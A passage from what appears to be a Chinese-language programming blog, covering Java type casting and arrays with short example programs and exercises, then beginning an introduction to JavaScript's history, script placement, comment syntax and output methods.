<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>表达式写法的习惯：</strong></font><br>  (1) 除非是简单的直观运算，应该尽量使用括号<br>  (2)另外，尽量不要写太长的表达式，过长的表达式容易引 起对求值次序的误解。<br></font> </p>
<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三、-数据类型转换"><a href="#三、-数据类型转换" class="headerlink" title="三、 数据类型转换  "></a><font color="#FF6347" face="Comic sans MS">三、 数据类型转换  </font></h3><h4 id="3-1-自动类型转换"><a href="#3-1-自动类型转换" class="headerlink" title="3.1  自动类型转换"></a><font color="#3CB371" face="Comic sans MS">3.1  自动类型转换</font></h4><p><font face="Comic sans MS">(1) Java中整型、实型、字符型数据可以混合运算。<br><font color="#00B2EE"><strong>运算过程中，Java自动把精度较低的类型转换为另一种精度较高的类型。</strong></font><br>(2) 低精度的值赋给高精度的变量可以自动转换,不出现编译错误；<font color="#00B2EE"><strong>相反会出现编译错误,需要强制转换。</strong></font><br>例如: float x&#x3D;(float)5.0;long x&#x3D;2;</p>
<p><font color="red"><strong>注意：</strong></font> 如果byte、short、char在一起运算时，会先将这些值转换为int型。再进行运算，结果为int型。 如表达式中一个变量是int型，另一个是long型，则先将int型转为long型，再进行计算。最后结果为long型。</font></p>
<p><img data-src="https://i.loli.net/2019/01/11/5c3881774735b.png" alt="7.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下列代码会编译出错，提示c = (a + b);有精度损失</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">      public static void main(String args[])</span><br><span class="line">     &#123;</span><br><span class="line">        byte a = 1;</span><br><span class="line">        byte b = 1;</span><br><span class="line">        byte c = (a + b);</span><br><span class="line">      &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<p>练习题3:<br>下列表达式结果是什么类型？<br>‘A’+2+2.5<br>double</p>
</blockquote>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-2-手动强制类型转换"><a href="#3-2-手动强制类型转换" class="headerlink" title="3.2  手动强制类型转换"></a><font color="#3CB371" face="Comic sans MS">3.2  手动强制类型转换</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>在Java中直接将高精度的值赋给低精度的变量会导致编译出错。这时可用强制类型转换来解决。</strong></font><br> 形式为：<br>&amp;emsp;&amp;emsp;<font color="red">       (类型名)表达式</font><br> 例如：<br>       int   i;   byte  b,c;<br>       b&#x3D;(byte)345;      &#x2F;&#x2F;上机测试知b得到89<br>       c&#x3D;(byte)356;      &#x2F;&#x2F;上机测试知c得到100<br>       i&#x3D;(int)(3.8+6);   &#x2F;&#x2F;强制转换后小数部分被截去，i得到9，不会四舍五入</p>
<p><font color="red"><strong>注意：</strong></font> </p>
<ol>
<li>强制类型转换可能造成信息的丢失；  </li>
<li>布尔型与其它基本类型之间不能转换。</font></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">加上强制类型转换，下列代码编译通过。</span><br><span class="line">class <span class="built_in">test</span></span><br><span class="line">&#123;     public static void main(String args[])</span><br><span class="line">     &#123;</span><br><span class="line">        byte a = 1;</span><br><span class="line">        byte b = 1;</span><br><span class="line">        byte c = (byte)(a + b);</span><br><span class="line">      &#125; &#125; </span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**运算时注意（一般的运算都有类型提升功能）：**</font> 
（1）在运算过程中，运算的结果至少是int型，即如果参与运算的两个数级别比int型低或是int型，则结果为
     int型；
（2）参与运算的数据如果有一个级别比int型高，则运算结果的类型与类型级别高的数相同；
（3）参与运算的两个数据如果类型不一样，会先把低级的数据转换成高级的类型的数据后再作运算，结果是高
     级的类型。
</font></td></tr></table>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-3-隐含强制类型转换"><a href="#3-3-隐含强制类型转换" class="headerlink" title="3.3  隐含强制类型转换"></a><font color="#3CB371" face="Comic sans MS">3.3  隐含强制类型转换</font></h4><p><font face="Comic sans MS">Java中允许把int类型的常量赋给byte、short变量时不需要强制类型转换<br>      byte b&#x3D;123;&#x2F;&#x2F;合法<br>      short s&#x3D;123;&#x2F;&#x2F;合法<br>      b&#x3D;b+3; &#x2F;&#x2F;不合法<br>&amp;emsp;<br>但是把int类型的变量赋给byte、short类型的变量时必须强制转换，否则会出错<br>     int i&#x3D;123;<br>     byte b&#x3D;i;  &#x2F;&#x2F;正确的做法是byte b&#x3D;(byte)i;<br>    byte a &#x3D; 1; byte c &#x3D; (byte)(a + b);<br></font></p>
<blockquote>
<blockquote>
<p>练习<br>设x,y,a分别为float,double,byte型变量，x&#x3D;3.3,y&#x3D;2.9,a&#x3D;5, 则表达式x+ (int)y&#x2F; 3*a的值为多少？值的类型是什么？ </p>
</blockquote>
</blockquote>
<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Java数组(3.9)</title>
    <url>/post/Java-Language-2-4/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>数组</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一、-一维数组"><a href="#一、-一维数组" class="headerlink" title="一、 一维数组 "></a><font color="#FF6347" face="Comic sans MS">一、 一维数组 </font></h3><p><font face="Comic sans MS"><font color="red"> <strong>数组：</strong> </font><font color="#00B2EE"><strong>相同类型的数据元素按顺序组成的一种线性表</strong></font>，元素在数组中的相对位置由下标来指定。数组中的每个元素通过数组名加下标进行引用。</p>
<p><font color="red"> <strong>数组有什么用处？</strong> </font><br><font color="#009ACD"><em>例：定义100个int型变量，求这100个变量的和。</em></font><br>int x1,x2,x3…x100;<br>int sum;<br>sum&#x3D;x1+x2+…+x100;<br>这样程序很复杂。<br><font color="#009ACD"><em>例：定义100个int型变量，求这100个变量的和。</em></font><br>有了数组后，可以这样编程：<br>int [] x&#x3D;new int[100];<br>int sum&#x3D;0;<br>for(int i&#x3D;0;i&lt;100;i++)<br>{<br>     sum&#x3D;sum+x[i];<br>}<br>这样使得程序编写方便很多。</p>
<p><font color="red"> <strong>注意：</strong> </font><br>Java中，数组是独立的<font color="#00B2EE"><strong>类</strong></font>，有自身的方法，<font color="#00B2EE"><strong>不只是变量的集合</strong></font>。在Java里创建一个数组，需要做如下的工作：<br>   （1）说明一个变量来存放该数组。<br>   （2）<font color="#00B2EE"><strong>建立一个新的数组对象</strong></font>（即创建数组空间）并把它赋给这个数组变量。<br>   （3）在该数组中存储信息。<br></font></p>
<p>&amp;emsp;&amp;emsp;<font color="red"> <strong>↓↓</strong> </font></p>
<blockquote>
<p>例如：String list[ ]&#x3D;new String[3];<br>             list[0]&#x3D;“one”;<br>             list[1]&#x3D;“two”;</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-1-一维数组的说明"><a href="#1-1-一维数组的说明" class="headerlink" title="1.1  一维数组的说明"></a><font color="#3CB371" face="Comic sans MS">1.1  一维数组的说明</font></h4><p><font face="Comic sans MS">同其他类变量一样，在使用数组前必须先说明它，一维数组说明的格式如下：<br><font color="red">&amp;emsp;       类型    数组名[ ]；<br>    或 类型[ ]    数组名；<br></font></font></p>
<blockquote>
<p>例如：int list[ ];<br>            int[] list;<br>            String[] args;<br>            String args[];</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-创建数组空间"><a href="#1-2-创建数组空间" class="headerlink" title="1.2  创建数组空间"></a><font color="#3CB371" face="Comic sans MS">1.2  创建数组空间</font></h4><p><font face="Comic sans MS">创建数组空间必须声明数组的长度，以确定所开辟的内存空间的大小，在Java中实际上就是通过new创建一个新的数组对象并把它赋给这个数组变量。其语法格式如下：<br><font color="red">&amp;emsp;&amp;emsp;&amp;emsp;数组名&#x3D;new 数组元素类型[数组元素个数]</font><br>例如：int[] list;   list&#x3D;new int[3];</p>
<p>数组的说明和构造合并在一起，其语法格式如下：<br><font color="red">&amp;emsp;&amp;emsp;&amp;emsp;          类型 数组名[ ]&#x3D;new 数组元素类型[数组元素个数]；]</font><br>例如：int list[ ]&#x3D;new int[3];<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-数组的初始化"><a href="#1-3-数组的初始化" class="headerlink" title="1.3  数组的初始化"></a><font color="#3CB371" face="Comic sans MS">1.3  数组的初始化</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 数组的初始化方式有两种：</strong></font><br>(1) 像初始化简单类型一样自动初始化数组，即在说明数组的同时进行初始化；<br>&amp;emsp;&amp;emsp;<font color="red">     int a[]&#x3D;{1,2,3,4}</font><br>(2) 先定义数组，然后为每个元素赋值。例如：<br>&amp;emsp;&amp;emsp;<font color="red">     int b[]&#x3D;new int[3];</font><br>&amp;emsp;&amp;emsp;<font color="red">     b[0]&#x3D;8;b[1]&#x3D;9;</font><br>&amp;emsp;<br><font color="red"><strong>2. 这样初始化也可以!</strong></font><br>另一种形式1：<br><font color="red">int[] a&#x3D;new int[]{1,2,3,4};</font>&amp;emsp;&amp;emsp; 等价于: int[] a&#x3D;{1,2,3,4}<br>{}中的元素个数决定了[]中的元素个数。{}中的元素取值决定了数组a各个元素的取值。</p>
<p>另一种形式2：<br><font color="red">int[] a;<br>a&#x3D;new int[]{1,2,3,4};</font><br>等价于：int[] a&#x3D;new int[3];<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; a[0]&#x3D;1;a[1]&#x3D;2;a[2]&#x3D;3;<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; a[3]&#x3D;4<br></font></p>
<blockquote>
<p>但是这样定义是错误的：<br>int[] a;<br>a&#x3D;{1,2,3,4};</p>
</blockquote>
<p><font face="Comic sans MS"><font color="red"><strong>定义数组要注意：</strong></font><br>(1) 不能这样定义数组：<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;          int a[5];<br>(2)不能这样初始化数组：<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;          int[] a;   a&#x3D;{1,2,3,4};<br>(3)使用new 创建数组之后，数组中的每个元素被自动初始化为0。<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;         int [] a&#x3D;new int[10];<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;         for(int i&#x3D;0;i&lt;10;i++)<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;           { System.out.println(“a[“+i+”]&#x3D;”+a[i]);<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;           }<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-数组元素的使用"><a href="#1-4-数组元素的使用" class="headerlink" title="1.4  数组元素的使用"></a><font color="#3CB371" face="Comic sans MS">1.4  数组元素的使用</font></h4><p><font face="Comic sans MS">数组元素的表示方式为：<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; <font color="red">数组名[下标]</font><br>&amp;emsp;<br><font color="red"><strong>使用数组时要注意：</strong></font><br>（1）数组越界异常:<font color="#00B2EE"><strong>Java在对数组元素操作时会对数组下标进行越界检查，以保证安全性。</strong></font>若在Java程序中超出了对数组下标的使用范围则在运行此程序时将出现如下错误信息：<br>&amp;emsp;&amp;emsp;    <em>Exception in thread “main”             Java.lang.ArrayIndexOutOfBoundsException</em><br>如下的错误即数组越界：int x[]&#x3D;{1,2,3,4};System.out.println(x[4]);</p>
<p>（2）每个数组都有一个属性length来指明其长度，字符串String用length()。<br>&amp;emsp;&amp;emsp;<font color="red">         <strong>list.length;</strong></font></p>
<p>（3）空指针异常<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">数组长度lengh的使用</span><br><span class="line"><span class="keyword">int</span> x[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;                  <span class="keyword">int</span> x[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)              <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;x.length;i++)    </span><br><span class="line">&#123;  System.out.println(x[i]);        &#123; System.out.println(x[i]); </span><br><span class="line">&#125;                                   &#125;</span><br><span class="line"></span><br><span class="line">空指针如下使用会导致错误</span><br><span class="line"><span class="keyword">int</span> x[]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">x=<span class="keyword">null</span>;</span><br><span class="line">x[<span class="number">0</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-5-一维数组使用举例"><a href="#1-5-一维数组使用举例" class="headerlink" title="1.5  一维数组使用举例"></a><font color="#3CB371" face="Comic sans MS">1.5  一维数组使用举例</font></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-12] 练习数组的创建和使用</span><br><span class="line">[例3-13] 练习数组越界</span><br><span class="line">[例3-14] 数组作为函数的参数</span><br><span class="line"></span><br><span class="line">[例3-12] HalfDollars.java 练习数组的创建与使用</span><br><span class="line">class HalfDollars&#123;</span><br><span class="line">	public static void main(String[] args)&#123;</span><br><span class="line">		int[] denver=&#123;15000006,18810000,20752110&#125;;</span><br><span class="line">		int[] philadelphia=new int[denver.length];</span><br><span class="line">		int[] total=new int[denver.length];</span><br><span class="line">		int average;</span><br><span class="line">		</span><br><span class="line">		philadelphia[0]=15020000;</span><br><span class="line">		philadelphia[1]=18709000;</span><br><span class="line">		philadelphia[2]=21348000;</span><br><span class="line">		</span><br><span class="line">		total[0]=denver[0]+philadelphia[0];</span><br><span class="line">		total[1]=denver[1]+philadelphia[1];</span><br><span class="line">		total[2]=denver[2]+philadelphia[2];</span><br><span class="line">		average=(total[0]+total[1]+total[2])/3;</span><br><span class="line">		System.out.println(<span class="string">&quot;1993 production:&quot;</span>+total[0]);</span><br><span class="line">        System.out.println(<span class="string">&quot;1994 production:&quot;</span>+total[1]);</span><br><span class="line">        System.out.println(<span class="string">&quot;1995 production:&quot;</span>+total[2]);</span><br><span class="line">        System.out.println(<span class="string">&quot;Average production:&quot;</span>+average);</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br><span class="line">运行结果：</span><br><span class="line">1993 production:30020006</span><br><span class="line">1994 production:37519000</span><br><span class="line">1995 production:42100110</span><br><span class="line">Average production:36546372</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[例3-13] ChoiceSort.java 数组的越界</span><br><span class="line">public class ChoiceSort</span><br><span class="line">&#123;</span><br><span class="line">	public static void main(String arg[])</span><br><span class="line">     &#123;   int i,min;</span><br><span class="line">          int str[]=&#123;2,13,41,58,32&#125;;</span><br><span class="line">          <span class="keyword">for</span>(i=0;i&lt;5;i++)</span><br><span class="line">          &#123;</span><br><span class="line">	         min=i;</span><br><span class="line">	        <span class="keyword">for</span>(int j=i+1;j&lt;6;j++)</span><br><span class="line">	         &#123;      </span><br><span class="line">	           <span class="keyword">if</span>(str[min]&gt;str[j])</span><br><span class="line">	         	 &#123;</span><br><span class="line">	              int at=str[j];</span><br><span class="line">	              str[j]=str[min];</span><br><span class="line">	              str[min]=at;</span><br><span class="line">	             &#125;</span><br><span class="line">	         &#125;  </span><br><span class="line">	      &#125;</span><br><span class="line">	    <span class="keyword">for</span>(i=0;i&lt;5;i++)</span><br><span class="line">	    System.out.println(str[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">运行结果：</span><br><span class="line">程序没能正常运行，抛出了“java.lang.ArrayIndexOutOfBoundsException”异常。 </span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">例[3-14] test.java 数组作为函数的参数</span><br><span class="line">class <span class="built_in">test</span>  </span><br><span class="line">&#123;   static void change(int [] a)  //输出a[0]和a[1]中大的那个数</span><br><span class="line">    &#123;    int t;</span><br><span class="line">         <span class="keyword">if</span>(a[0]&lt;a[1])</span><br><span class="line">         &#123;        t=a[0];</span><br><span class="line">                  a[0]=a[1];</span><br><span class="line">                  a[1]=t;</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println(a[0]);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String args[])</span><br><span class="line">   &#123;    int x[]=&#123;5,12&#125;;</span><br><span class="line">        change(x);     //调用过后，数组x可能发生变化</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-二维数组"><a href="#二、-二维数组" class="headerlink" title="二、 二维数组 "></a><font color="#FF6347" face="Comic sans MS">二、 二维数组 </font></h3><p><font face="Comic sans MS">Java中的多维数组实际上是数组的数组。不一定是规则的矩阵数组。<br><font color="red">多维数组：数组的数组，例如，二维数组为一个特殊的一维数组，其每个元素又是一个一维数组<br></font></font></p>
<p><img data-src="https://i.loli.net/2019/01/13/5c3ad27f549bb.png" alt="1.png"><img data-src="https://i.loli.net/2019/01/13/5c3ad282ed579.png" alt="2.png"></p>
<p>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>二维数组说明的格式为：</strong></font><br><font color="red">&amp;emsp;  类型    数组名[ ][ ]；<br>      或                  类型[ ][ ]     数组名；<br></font><br>例如，说明一个整型的二维数组如下：<br><font color="red">&amp;emsp;    int intArray[ ][ ];或 int[ ][ ] intArray;<br></font></p>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>二维数组的创建：</strong></font><br>直接为每一维分配空间，如：<br><font color="red">&amp;emsp;       int a[ ][ ]&#x3D;new int[2][3];</font><br></font></p>
<p>|||<br>:-: | :-: | :-:<br>a[0][0]|a[0][1]|a[0][2]<br>a[1][0]|a[1][1]|a[1][2]</p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>从最高维开始，分别为每一维分配空间，如：</strong></font><br>int b[ ][ ]&#x3D;new int[2][ ];<br>b[0]&#x3D;new int[3];<br>b[1]&#x3D;new int[5];<br></font></p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">b[0][0]</td>
<td align="center">b[0][1]</td>
<td align="center">b[0][2]</td>
</tr>
<tr>
<td align="center">b[1][0]</td>
<td align="center">b[1][1]</td>
<td align="center">b[1][2]</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>元素的初始化：</strong></font><br>（1）直接对每个元素进行赋值。<br>（2）在说明数组的同时进行初始化。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例如：  int[][] a=new int[3][2]：</span><br><span class="line">              a[0][0]=2； a[0][1]=3</span><br><span class="line">              a[1][0]=1； a[1][1]=5</span><br><span class="line">              a[2][0]=3； a[2][1]=4  </span><br><span class="line">等价于：int a[ ][ ]=&#123;&#123;2,3&#125;,&#123;1,5&#125;,&#123;3,4&#125;&#125;; </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>总结：与数组操作相关的系统函数</strong></font><br><font color="#00B2EE"><strong>（1）使用Arrays.sort来对数组排序</strong></font><br>int x[]&#x3D;new int[]{3,2,1,4};<br>java.util.Arrays.sort(x);  &#x2F;&#x2F;对数组x内的元素进行排序（升序）<br>for(int i&#x3D;0;i &lt; x.length;i++)<br>{<br>      System.out.println(x[i]);<br>}</p>
<p><font color="#00B2EE"><strong>（2）使用Arrays.binarySearch函数对数组进行二分查找</strong></font><br>int [] x&#x3D;new int[]{2,5,1,6,8,3};<br>java.util.Arrays.sort(x);<br>System.out.println(java.util.Arrays.binarySearch(x,1));   &#x2F;&#x2F;二分查找，在数组x中查找1，输出0 ;如果没找到，则会输出一个&lt;0的数</p>
<p><font color="#00B2EE"><strong>（3）使用System.arraycopy函数拷贝数组</strong></font><br>int [] x;<br>x&#x3D;new int[]{3,1,2,4};<br>int [] y;<br>y&#x3D;new int[4];<br>System.arraycopy(x,0,y,0,4);<br>&#x2F;&#x2F;将数组x内的 4个元素拷贝给数组y </p>
<p><font color="#00B2EE"><strong>（4）使用Ayyars.fill函数填充数组</strong></font><br>int [] x;<br>x&#x3D;new int[]{3,1,2,4};<br>java.util.Arrays.fill(x,7);    &#x2F;&#x2F;数组x中的4个元素都改为7<br></font></p>
<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript</title>
    <url>/post/JavaScript/</url>
    <content><![CDATA[<p>JavaScript 语句和 JavaScript 变量都对大小写敏感。( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<span id="more"></span>


<br />

<br />

<center><font color="#00B2EE" face="Comic sans MS" size=5>JavaScript 基础</font> </center>



<br />

<br />

<h3 id="一-JavaScript-简介"><a href="#一-JavaScript-简介" class="headerlink" title="一. JavaScript 简介"></a><font color="#FF6347" face="Comic sans MS">一. JavaScript 简介</font></h3><br />

<h4 id="1-1-JavaScript-由来"><a href="#1-1-JavaScript-由来" class="headerlink" title="1.1 JavaScript 由来"></a><font color="#3CB371" face="Comic sans MS">1.1 JavaScript 由来</font></h4><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（1） 关于JavaScript</strong></font></p>
<p>在上个世纪的1995年，当时的网景公司正凭借其Navigator浏览器成为Web时代开启时最著名的第一代互联网公司。</p>
<p>由于网景公司希望能在静态HTML页面上添加一些动态效果，于是叫Brendan Eich这哥们在两周之内设计出了JavaScript语言。你没看错，这哥们只用了10天时间。</p>
<p>为什么起名叫JavaScript？原因是当时Java语言非常红火，所以网景公司希望借Java的名气来推广，但事实上JavaScript除了语法上有点像Java，其他部分基本上没啥关系。</p>
<br />

<p><strong>ECMAScript</strong></p>
<p>因为网景开发了JavaScript，一年后微软又模仿JavaScript开发了JScript，为了让JavaScript成为全球标准，几个公司联合ECMA（European Computer Manufacturers Association）组织定制了JavaScript语言的标准，被称为ECMAScript标准。</p>
<p>所以简单说来就是，ECMAScript是一种语言标准，而JavaScript是网景公司对ECMAScript标准的一种实现。</p>
<p>那为什么不直接把JavaScript定为标准呢？因为JavaScript是网景的注册商标。</p>
<p>不过大多数时候，我们还是用JavaScript这个词。如果你遇到ECMAScript这个词，简单把它替换为JavaScript就行了。</p>
<br />

<p><strong>JavaScript版本</strong></p>
<p>JavaScript语言是在10天时间内设计出来的，虽然语言的设计者水平非常NB，但谁也架不住“时间紧，任务重”，所以，JavaScript有很多设计缺陷，我们后面会慢慢讲到。</p>
<p>此外，由于JavaScript的标准——ECMAScript在不断发展，最新版ECMAScript 6标准（简称ES6）已经在2015年6月正式发布了，所以，讲到JavaScript的版本，实际上就是说它实现了ECMAScript标准的哪个版本。</p>
<p>由于浏览器在发布时就确定了JavaScript的版本，加上很多用户还在使用IE6这种古老的浏览器，这就导致你在写JavaScript的时候，要照顾一下老用户，不能一上来就用最新的ES6标准写，否则，老用户的浏览器是无法运行新版本的JavaScript代码的。</p>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（2） JavaScript是什么？</strong></font></p>
<ul>
<li><p>JavaScript是一种小型的、轻量级的、面向对象的、跨平台的客户端脚本语言。</p>
</li>
<li><p>JavaScript是嵌入到浏览器软件当中的去的，只要你的电脑有浏览器就可以执行JS程序了。JavaScript是一种面向对象的程序语言。在程序中，对象是由“属性”和“方法”构成。</p>
</li>
<li><p><strong>跨平台：</strong>JS程序可以在多种平台下运行，如：windows、linux、mac、IOS等。</p>
</li>
<li><p><strong>客户端脚本程序：</strong>JS只能在客户端的浏览器来运行，不能在服务器端来运行。</p>
</li>
<li><p><strong>浏览器是一个翻译器</strong>，可以翻译三种代码：HTML代码、CSS代码、JavaScript代码。</p>
</li>
<li><p>JavaScript 是可插入 HTML 页面的编程代码。</p>
</li>
</ul>
<p><strong>注：JS中的对象只要会用就可以了，不需要我们自己去开发对象。</strong></p>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（3） JavaScript能干什么？</strong></font></p>
<ul>
<li><p><strong>表单验证：</strong>是JS最基本的功能。</p>
</li>
<li><p><strong>动态HTML：</strong>可以实现一些动态的、重复的效果。</p>
</li>
<li><p><strong>交互式：</strong>人机交互，通过键盘或鼠标，与网页中的元素进行交互。</p>
</li>
</ul>
<br />

<br />

<h4 id="1-2-JavaScript-规则"><a href="#1-2-JavaScript-规则" class="headerlink" title="1.2 JavaScript 规则"></a><font color="#3CB371" face="Comic sans MS">1.2 JavaScript 规则</font></h4><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（1） JavaScript用法</strong></font></p>
<ul>
<li><p>同一个网页中，可以有HTML代码、CSS代码、JavaScript代码。</p>
</li>
<li><p>通过**<code>&lt;script&gt;&lt;/script&gt;</code>**来引入JS程序代码。即HTML 中的脚本必须位于 <code>&lt;script&gt;</code> 与 <code>&lt;/script&gt;</code> 标签之间。<code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 会告诉 JavaScript 在何处开始和结束。</p>
</li>
</ul>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（2） 脚本的放置位置</strong></font></p>
<p>脚本可被放置在：</p>
<ol>
<li>放在HTML页面的<code>&lt;head&gt;&lt;/head&gt;</code> 里；</li>
<li>放在HTML页面的 <code>&lt;body&gt;&lt;/body&gt;</code> 里；或者同时放在二者中；</li>
<li>放在外部 .js文件里，这个文件里面直接写js脚本，不用再写<code>&lt;script&gt;&lt;/script&gt;</code>这两个标签。</li>
</ol>
<br />

<p><strong>a. 把 JavaScript 代码放在<code>&lt;head&gt;&lt;/head&gt;</code> 和放在 <code>&lt;body&gt;&lt;/body&gt;</code> 里的区别：</strong></p>
<ul>
<li>简单地说，放在 <code>&lt;head&gt;&lt;/head&gt;</code> 里的会比放在 <code>&lt;body&gt;&lt;/body&gt;</code> 先执行。head 标签里的代码会在页面还未开始绘制之前被解析，而在 body 里的代码则会在页面渲染的同时在读取到这段代码的时候才被执行。</li>
<li>通常的做法是把函数放入 <code>&lt;head&gt;</code> 部分中，或者放在页面底部。这样就可以把它们安置到同一处位置，不会干扰页面的内容。</li>
</ul>
<br />

<p><strong>b. 外部的 JavaScript</strong></p>
<ul>
<li>也可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。</li>
<li>外部 JavaScript 文件的文件扩展名是 .js。</li>
<li>如需使用外部文件，请在 <code>&lt;script&gt;</code> 标签的 “src” 属性中设置该 .js 文件：</li>
<li>可以将脚本放置于 <code>&lt;head&gt;</code> 或者 <code>&lt;body&gt;</code>中，放在 <code>&lt;script&gt;</code> 标签中的脚本与外部引用的脚本运行效果完全一致。</li>
</ul>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;myScript.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>说明：</strong>那些老旧的实例可能会在 <code>&lt;script&gt;</code> 标签中使用 <code>type=&quot;text/javascript&quot;</code>。现在已经不必这样做了。JavaScript 是所有现代浏览器以及 HTML5 中的默认脚本语言。</p>
</blockquote>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（3） 关于注释</strong></font></p>
<ol>
<li><p>C&#x2F;C++&#x2F;C#&#x2F;Java&#x2F;JavaScript：单行使用**<code>//</code><strong>,多行使用</strong><code>/*...*/</code>**</p>
</li>
<li><p>MYSQL&#x2F;Python：**<code>#</code>**</p>
</li>
<li><p>PHP：单行使用**<code>//</code>**，多行使用三对单引号或者双引号</p>
</li>
<li><p>CSS：**<code>/*...*/</code>**</p>
</li>
<li><p>HTML：**<code>&lt;!--注释内容--&gt;</code>**</p>
</li>
</ol>
<br />

<br />

<h4 id="1-3-JavaScript-输出"><a href="#1-3-JavaScript-输出" class="headerlink" title="1.3 JavaScript 输出"></a><font color="#3CB371" face="Comic sans MS">1.3 JavaScript 输出</font></h4><blockquote>
<p><font color="#FF7F00"><strong>JavaScript 显示数据</strong></font></p>
</blockquote>
<ol>
<li>使用 window.alert() 弹出警告框。</li>
<li>使用 document.write() 方法将内容写到 HTML 文档中。</li>
<li>使用 innerHTML 写入到 HTML 元素。</li>
<li>使用 console.log() 写入到浏览器的控制台。</li>
</ol>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（1） window.alert(str) 弹出警告框</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>描述：</strong></font>在当前窗口中弹出一个警告对话框，str为对话框中显示的内容。<br>window：代表当前浏览器窗口，window是一个窗口对象。<br>alert()：弹出一个对话框。<br>str：表示要输出的内容。</p>
</blockquote>
<br />

<p>实例：</p>
